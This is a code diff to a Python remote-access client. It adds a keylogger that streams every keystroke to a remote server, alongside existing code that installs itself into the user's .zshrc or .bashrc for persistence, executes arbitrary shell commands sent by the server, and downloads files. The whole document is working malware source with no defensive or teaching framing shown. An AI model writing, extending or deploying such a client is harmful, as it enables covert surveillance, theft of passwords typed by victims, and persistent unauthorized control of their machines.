@@ -1,9 +1,52 @@
 import socket, subprocess, os, sys
 import random
+from threading import Thread
 from time import sleep
-'''
-First, make this script start every time the user starts their computer, or a new shell. (If they are running linux)
-'''
+from pynput import keyboard
+import pynput
+
+SERVER_HOST = "127.0.0.1" #DEFAULT SERVER HOST
+SERVER_PORT = 8080 #DEFAULT SERVER PORT
+BUFFER_SIZE = 1024 * 128 #128KB max size
+
+#If the user sends a custom IP and port
+if len(sys.argv) == 2: #only custom IP
+    SERVER_HOST = sys.argv[1]
+elif len(sys.argv) == 3: #custom IP and port
+    SERVER_HOST = sys.argv[1]
+    try:
+        SERVER_PORT = int(sys.argv[2])
+    except:
+        print("Can not cast port to int!")
+
+#Keylogging Functions
+def on_key_press(key):
+    if not keyLoggerAlive:
+        return False
+    if key == keyboard.Key.enter:
+        s.send("ENTER".encode())
+    elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
+        return
+    elif key == keyboard.Key.backspace:
+        s.send("BACKSPACE".encode())
+    elif key == keyboard.Key.space:
+        s.send(" ".encode())
+    else:
+        key = str(key)
+        key = key.strip("'")
+        s.send(key.encode())
+
+#Keylogging Functions
+def start_keylog():
+    with pynput.keyboard.Listener(on_press=on_key_press) as listener:
+        global keyLoggerAlive
+        if not keyLoggerAlive:
+            pynput.keyboard.Listener.stop()
+            listener.stop()
+        else:
+            listener.join()
+
+#For persistence, see if the user uses zsh or bash. If they use neither, then don't do any persistence.
 try:
     #If they use zshrc, set that to the rcFile to edit
     if os.path.exists(f"{os.path.expanduser('~')}/.zshrc"):
@@ -30,20 +73,6 @@ try:
             file.write(f"python3 {os.path.expanduser('~')}/.client.py &\n")
 except:
     pass
-
-SERVER_HOST = "127.0.0.1" #DEFAULT SERVER HOST
-SERVER_PORT = 8080 #DEFAULT SERVER PORT
-BUFFER_SIZE = 1024 * 128 #128KB max size
-
-#If the user sends a custom IP and port
-if len(sys.argv) == 2:
-    SERVER_HOST = sys.argv[1]
-elif len(sys.argv) == 3:
-    SERVER_HOST = sys.argv[1]
-    try:
-        SERVER_PORT = int(sys.argv[2])
-    except:
-        print("Can not cast port to int!")
 
 DISCONNECTED = True #Initially, start disconnected
 
@@ -110,9 +139,16 @@ while True:
         except Exception as e:
             s.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
 
+    elif command == "START_KEYL0GGER":
+        global keyLoggerAlive
+        keyLoggerAlive = True
+        keyLogThread = Thread(target=start_keylog)
+        keyLogThread.start()
+        if s.recv(BUFFER_SIZE).decode() == "KEY_L0GGER-END":
+            keyLoggerAlive = False
+            continue
 
-
-    else: #if the user doesn't want to change directories, run the command and capture the output
+    else: #if the user doesn't want to perform a special action, run the command and capture the output
         #if the command runs for longer than 5 seconds, timeout
         try:
             output = subprocess.run(command, shell=True,capture_output=True,text=True,timeout=5).stdout 
@@ -122,3 +158,4 @@ while True:
     s.send(message.encode())
 
 s.close() #close the socket on exit
+
